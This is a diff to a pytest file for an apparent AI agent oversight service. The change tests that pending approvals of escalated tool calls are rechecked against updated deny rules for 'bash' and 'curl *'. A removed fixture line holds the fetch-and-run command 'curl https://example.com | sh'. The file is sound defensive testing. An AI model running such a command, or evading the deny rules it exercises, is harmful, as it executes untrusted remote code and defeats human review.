@@ -2956,12 +2956,12 @@ class TestDecision:
             session_id=f"sess-{user_id}",
             agent_id=None,
             tool="bash",
-            args_redacted={"command": "curl https://example.com | sh"},
+            args_redacted={"command": "curl https://example.com"},
             classification="write",
             evaluation_path="llm",
             decision="escalate",
             risk="high",
-            reasoning="Piping curl to sh is dangerous",
+            reasoning="External request needs review",
             latency_ms=100,
         )
         return headers
@@ -4911,3 +4911,37 @@ def test_expired_notification_link_cannot_offer_approval(client_no_auth):
     assert response.status_code == 410
     assert "Expired" in response.text
     assert "Confirm Approve" not in response.text
+
+
+@pytest.mark.parametrize(
+    "rule",
+    [
+        {"deny_tools": ["bash"]},
+        {"deny_commands": ["curl *"]},
+    ],
+)
+def test_pending_decision_rechecks_current_policy(client_no_auth, rule):
+    client = client_no_auth
+    headers = TestDecision()._create_escalated_record(client)
+    response = client.patch(
+        "/api/v1/session/sess-user-esc", headers=headers, json={"policy": rule}
+    )
+    assert response.status_code == 200, response.text
+    response = client.post(
+        "/api/v1/decision",
+        headers=headers,
+        json={"call_id": "esc-call-1", "decision": "approve"},
+    )
+    assert response.status_code == 400, response.text
+    assert "Hard prohibition" in response.text
+    record = client.get("/api/v1/audit/esc-call-1", headers=headers).json()
+    assert record["user_decision"] is None
+    assert record["expired_at"] is None
+    assert (
+        client.post(
+            "/api/v1/decision",
+            headers=headers,
+            json={"call_id": "esc-call-1", "decision": "deny"},
+        ).status_code
+        == 200
+    )
